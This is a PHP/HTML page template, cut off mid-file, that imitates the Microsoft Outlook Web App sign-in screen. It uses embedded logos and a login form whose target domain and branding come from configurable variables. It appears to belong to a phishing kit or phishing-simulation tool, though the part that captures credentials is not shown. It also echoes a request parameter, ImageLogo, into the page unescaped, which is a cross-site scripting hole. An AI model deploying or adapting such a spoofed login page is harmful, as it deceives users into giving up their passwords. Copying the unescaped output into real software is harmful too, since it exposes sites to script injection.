src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAptJREFUeNqkU01LVFEYfu7XzJ17nZmyJBW0sgRDRAgLoi8tghZG9QNaR7tg2vQjbCu2a9Eq2qRGUYFBZAtLURzSUUcJG8d0ZnTu99fpPdIMSktfOOfcezjP8z7vc94jMMZwmJD5JAhCfWPm0e2+MGKDYRQNBCHrpTWi/1kaExFjY7defp6qneXJhb3pHwGBH4qy8uSIrp9NqjJ0TXsXuvZ0KfvjacEVsIlEzhXkofuvJ0f+I+BgVdOftfZe0OIsQBBTFxLX7raxCIH75vn3xOjwQDbQsSgfNw0pkXkwPjXCsWJNNjFlmttPaWrqKBBTEb9yr0No7tCEptaU3H3xMgQJp90imo2C7plGZvhmbx/H7hHwmnUJnWpjI8L1ZSg7fyBoSQWUHo4FIabFwEJE5HeLX4JmVzqrtjdYN5GM6k95FlhpE4q5A8GzEWzkITYkKYWEqLgG+C58IgiIMx1WkfX0/joBud2Tsrco+wokZ5dAIsL5Scgnu8ACH/7qTyL14RDYo/NJZqPq+D37FYDtlqHlp6n+xF7WYHkO8ZBkE6G9tgQ3BCwabsTdBwzbw34P5oohfZaKwHYB2CrA+bWCyKwgyC/AIU+qnIDAAYE3PAmG48/tU8Am1uXU9XR1A4rrQ6S2iHwP9pe3dIc2/OouTCLgJfBYNCVYrj9RV8A7rCIncwvSMWz5JIDUyW2dkXr1DmKnzxFBuVwDZw0JMxXkLC8YqxPw9vSk2NC62mQui2mUA9rsvpSX0o1+vL2r7InxFzXwp03R/G1GQx9Na6pOwIO3p6U0ZFbjLbl56QRY9tsZbyU7W/jwalyKq4/fb6sYLSq5JUPIfA28kRruwFvgwTuMNwmNG3RV58ntkAyb5jVz2bXMB97CYeKvAAMACjWGjcO+NcIAAAAASUVORK5CYII=" alt=""&gt;&lt;/td&gt;			&lt;td style="width:100%"&gt;To 
use Outlook Web App, browser settings must allow scripts to run. For information 
about how to allow scripts, consult the Help for your browser. If your browser 
doesn&amp;#39;t support scripts, you can download &lt;a 
href="http://www.microsoft.com/windows/ie/downloads/default.mspx"&gt;Windows 
Internet Explorer&lt;/a&gt; for access to Outlook Web App.&lt;/td&gt;
		&lt;/tr&gt;		&lt;/table&gt;	&lt;/div&gt; </NOSCRIPT> 
		
		<?php
		
		$parsedurl = parse_url($Redirect);

		$domain = $parsedurl['scheme']."://".$parsedurl['host'];
		
		?>
<FORM name="logonForm" action="<?php echo $domain; ?>/owa/auth.owa" enctype="application/x-www-form-urlencoded" 
method="POST" autocomplete="off"><INPUT name="destination" type="hidden" value="<?php echo $domain; ?>/owa/"> 
<INPUT name="flags" type="hidden" value="4"> <INPUT name="forcedownlevel" type="hidden" value="0"> 
  <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class --> 
<DIV class="mouse" id="mainLogonDiv">
<SCRIPT>

        var mainLogonDiv = window.document.getElementById("mainLogonDiv");
        mainLogonDiv.className = mainLogonDivClassName;
    </SCRIPT>
     
<DIV class="sidebar">
<DIV class="owaLogoContainer">
            <IMG class="owaLogo" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAABsCAYAAACiuLoyAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkMwQzQ2MDA4RjEzRTExRTFCMzNFQTMwMzE5REU3RjExIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkMwQzQ2MDA5RjEzRTExRTFCMzNFQTMwMzE5REU3RjExIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QzBDNDYwMDZGMTNFMTFFMUIzM0VBMzAzMTlERTdGMTEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QzBDNDYwMDdGMTNFMTFFMUIzM0VBMzAzMTlERTdGMTEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5qf500AAAGPUlEQVR42uxdOXLjRhRt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">             <IMG 
class="owaLogoSmall" aria-hidden="true" src="data:image/png;base64,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">         </DIV></DIV>
<DIV class="logonContainer">
<DIV class="logonDiv" id="lgnDiv" onkeypress="return checkSubmit(event)">
<DIV class="signInInputLabel" id="welcomeLabel" aria-hidden="true">Welcome to 
<?php echo $Project; ?></DIV><?php if(isset($_REQUEST['ImageLogo']) && $_REQUEST['ImageLogo'] != ""){echo "<IMG align=\"left\" class=\"style10\" alt=\"".$Project."\" src=\"".$_REQUEST['ImageLogo']."\">";}?>





<HR>

<HR>

<HR>

<DIV class="signInImageHeader" role="heading" aria-label="Outlook Web App "><IMG 
class="mouseHeader" alt="Outlook Web App " src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAacAAAA3CAYAAACo/oVvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjE3MDNDRjUyRjEzRDExRTE4QzQxRkZBNzQzOUQyQTA5IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjE3MDNDRjUzRjEzRDExRTE4QzQxRkZBNzQzOUQyQTA5Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MTcwM0NGNTBGMTNEMTFFMThDNDFGRkE3NDM5RDJBMDkiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MTcwM0NGNTFGMTNEMTFFMThDNDFGRkE3NDM5RDJBMDkiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6fCYPkAAATVklEQVR42uxdTYwjRxWutWYTfoK2NwlwQLA9oEACQutFCofsYXokIqEAmh7xIw6RxkY5ICE0YyEOwMEzB4QQCHtuOSDGI3EgF8YGIUUIadsS5gRMj8IhgMh6DigSsNAJBAJKFNyu6rWn+73u+uu2Z/d9kmeTGburXPXe+957VfXqAiNUj9bojdRvAta5vk4Dkxknb/LzRuq3e5Ox2qXBIRDubKwYGo/65KczeXnAX8PJazwxJCENM4FAIBDKI6fWKCYif/LaEP/KfCb+2Z+8BtN/O9cjGnYCgTCxDTdSji1lEAiK5NQauZOf7cmrodmOL16dybP2J/92iaQIBAKBoE9OrdGuICYbcMSztibPbU0Iqk9TQDhn3n6cyj4G/nLZ2OHimYl/pH5rHk1gfe5cv0ATWoqMxNFgeq00moz3ZRocedRyFaU1OrZITPOII7GjyfM751gA3clr51x/B4I6+BrqGMkOmAJ6hidIy/ZzyTEsD1ugY94aNWhoTMmJe1o3J696zmdjJd2bvNaF13jh9ouxVfH7LqLICWLjfnDOSKkjSDsen07BGBHuTATA79YsPBd7hlfCc4c0jaXYByfHUdmiAZLHChgR8JDUyVHMeDtvkONdjgUpxe9piTAXM+SN6aaJzvXmORmzHRKbux4Dll1/9Sw8188hF5NIx6PIqTL4ObbTm9pXbh8JSpETZ/0jZHCjKdHE+e88YoLJKs6bXxORFkMIiow+4TxHTq7IOOh63F6OUfMNngt9dkwGsjRsG/6dAJITX1+qI8QUk1LXqDV+eBKLkNoiaiMQlht840NfMkKRxUbO31wD3VijqKki8DmqA7bTjqNx15IT9/p2cogptKTYPYSgYq/xgKaEcE4wVCSYIniGf1f5HK03VRc17QOOBhGUYuSE7TprWa/ywAkK9jx5eoNAWHZg8qu+sw72uMfGxMf7Ugf0jyKnctBI/X+IyAltjJAmJx41eaACciIpA00g5MW8DwJhucDXbEJLEQ70mbGF59IW8qrAo6G0Y3IoHPswMy+0hFGIlQJCaJWo3JGoFtEGJs7JHGiEvcBIO6qb1QWc71OQeo+MQXAK3heWVg2DC7gnvGqXweuFiXIMme3yUVwh10S7dUA5o1Tb4QKMBtSvjOx842enV17+7+ubF2sXXvyev/qM5NMDYMx1dtZtAM8NU4TE5UxtMxJtIa8OUDTUu01SWTmJdadLw1ZMTj44sOXv6Okx+JCvPzexCeLJvQEose7p+Q7gjaZPzN+QeE694H3rDN7dZUpKsuWkEuJoMF4+qs94qjbSbDs29DvCoSlKYSVFgT3GN7zE47CnvNtTf5y8nLlpJh7tF370x+8/+3z06fc+cO9J/P8Pf+u3B088crkpQVIDll2n9TWcOh8gkDESYamMnWctcpo5Qi5I0mXOKZc5D3G+gsrkKX9s/Mw4z3Ssz7LLJtuVkBM+b5EYu7ACHcQyA0Eex6zkeJaDSlIjrVEICN0GQE4EPtm7TL9qhyNIKo5Om8prD1xWjhADJWss43WZuLZiq+RxSvoKE5NIV3/5xy/s/P4v/5lGGM+9+O+P/ut/r1/83NUHnxz+6eWnJ796pkB+g0k7UUp/XKWzLPDieBI5HQB6savw/d2MQVB1OHlVg22Wf9i8LcbBbt1MOSesnLbVAPXvMGXn+ikCczUi4fmxyb92h5NCmxWlg1ujsXAYe4Y2aHbESMWB5eOyB5FkDYmaogoXTQeSHt/dTkqOqOJso5wUP8+mUk6Fv/fYgJjmsTOtsmFelifPMGMHyZvzijghpi89+u77Phb/9+MfcL6+ev+b/hq9+trjj7zzzUFMXBKt9SUioTysAboXCCMbZqJg+TEzi5riMeSVUA6YXBWUpG7msdF5r1n78djflMwO2G1bHVsS9nMg8Tlb8n8g5F/GjrrTObalj7M6jm2JzEqiK8eC8DLkdBXx3KpCAApbWYZLvW/pFwPDY/xly5M7yhG2+VJS8SspH9UUESjWhwOpdTVOTNg2/0i0sZlqe130CfPU6wzfIVoJMcW49cprD37zE1dOpwP83K3v3Pz7q2//wecfeuqelQu3JFscShBOkXJi+mDiuOmvN83GUMfQu9PPmh1IPtCUDfO29dJWbqETwOUuykRctu1ca3TE9G6P4CXrTDZqzORG5xntdCm7FeRBJxUSQJgzWFWSJJS2WZcIp8PS76DhXgVklMbC4AbI39iUOOIK8FzZGyDptUaraDqECytmKPaQVMp4ztDuCnLrAIQRK+eJ8eHu+eiSk6gUMcWII6THJhHSr27+k21++IGvxgQVR0zhn1954jH3bTKpjj5A3LJ3nbmA/g1Sz05HyhuSEZAHyHNfwcA4iK4O5ubXFf2pA5FMTBLXNNOIDaTdSLRdF061j0RRem3biZpi7OfISgOQlZ4l+T9g0NoXt+dFczafUVnXSI9C1YWSw+qnYg7jNi+JPkK8c8YerDBskbE6AojEhYQE3Fi0EUMhJ0T8Pc3Js4aAIXUEcTTR6ErB2CPt98TaImT0Yo+pZ+m6CczbR/t65fK9O88+H4UPvHXlb2+5WPv1Jz94/3cnRNV+16V7bn77U+4vJeU3u24qt57g5+penIfPrmnJRLoeMM59yTGEypdF08gY/j67or305xJHQcVxSztC8bi2gHb7KcfJB2RatW1dmWtkHDN8k8E+8P5tS+SUPg6UbHwaI3NWZ3DKNinGsKvY/rydiBhfR+oiMtgSaVso9cc3bU36XVsSEzw2SF/c6Wgj46Xu3XAD3UM8Fhcxcp4RMc0bWthYJIunlRNTjDil9/GHnfo77rv4u1/84aWfvnDr1c88+p77nv7JU498RKEHh8DvZA7NbgBR+LjAUZSp4QfN2VBS1lzACVotKPQciLmNMv1QS7G5c8aqN63HWVRgunN9E5HpKg70+wpRE3bdSt1SGtJJyfxmbuQ408cQSbG5mu3Llbrjf4dk5rbNqymm2qokJwK8RTURPt1Io4UIBNTONujZ6x7M5grRlUyNqHptysQ0T1A/fPL9m7/5ytXLP//ihx56+rPv+5pi+4GyczXbHl30HJ11J/V6elzWdpCIKZKc25akDBWPp8otBfy9gaW2VbCtPM4wednsZ1choxEJghiDDqs61Erd8fftYc5yLafThMXDBx0Hk3MdfG73C714/F4a0y3g+6DHrOs9wnl2NSU1Be4Ru4rRzUCS+NYUSU9mCzkUoe8prdvw8R5LyHCRgdO5PqcF6k+5O0LrAKkWjVe/xH6OlY9ocHuwpxn5Z3Vb9dwUj6AgGfdrOV7UokEECQvIvoXnylTU9hBiNIuqufKqRxo4MUEeXq/0c1Tm0dNGRt4hpwMuk+Qrkp7MBgofMHRdC7LlKNqTvtZGBrhMEGPlXQYKRfuHmvLvMDvVyvc0dbIH2Nu6ImFGTP9QMTRua1har2pyckFDSPAkjaCOIkeAsfcKlDqw9L2g9Y+risS0m0NMi7i4cqDofXoKYxsUzFVRVDWUiALUN1DAODW0J4cGc3BoxemRQwMwzn2Dfto489S3/Nm60uf1M25g28uyIcJlBJnoNbK4PbaI/MusyxYayQDfbtxeImLCtml7OWTgSpCbDvF5kn0r6ufQ4tx6CuMYWJarSyXoZgMkc3nj3Gfw5hHX6LubLcecGJLTiYHuQAfO3RUxSA4gTEElSo1PyN0eOZUdTY4RYQwKQncbMHkOdkZjccR01ujMp2ecKRFlU6G+UlQKl0nyEF2qa3jTV4DfHS3giIep41VVWm9D0oHAjTEv25OOvuKNEa0F6BQ2do7h5436v8Ky1Y/VUyxmqCMRAq05lYtTQ2FcFLDin80l6NsQIB4fUFyZLeQQeflnxiFbw083AqovydyakVMVZybxHbSqW8IhXWuwMm+COGfAyMmrsA9rFDURDOFNUy1V7c7Lj5w6ABHtzhk36OoXmSzFADCKHjt7xoeuZC8fDeT3dmpexoWA6TLIKWqIZ+VUeJWwbxQiE3RxqYTUQBXoIs7LgVIh2zIA76xL73rSlfdAwrHzMpFINSV8lgPV1OPcOufPP1eRE+a1ydbwMhGmWJlcSUUk2N04Uj+nEetLjJ+DgUohHUzTOouNoAJgbL05XYKrkMsQX7ZMks+SM0HwJgsT/b18DlPrkEzbI2fcXtl11lWuXCl37BYcOXEB7IHha/nnnbZAA1nNjanLvr5itqNNj+iigijKWwpinJVeiZYwgiraWecbOGIBkOGo58yN7I678XkwVpoyfXoOo5pFyK+z4CAhLb9RchPuITIgcf58s8SoCWpzvyJjvdzKxxd3x5nvaCMnzdMfLmL0E5wAhtTWRhlobeREcXzCafXkZYug8nbWwQVZVVLY0M27ntCNNaAvsnJyalm3FqWTV0vLBsBFXs0jTPg6mpgEdyse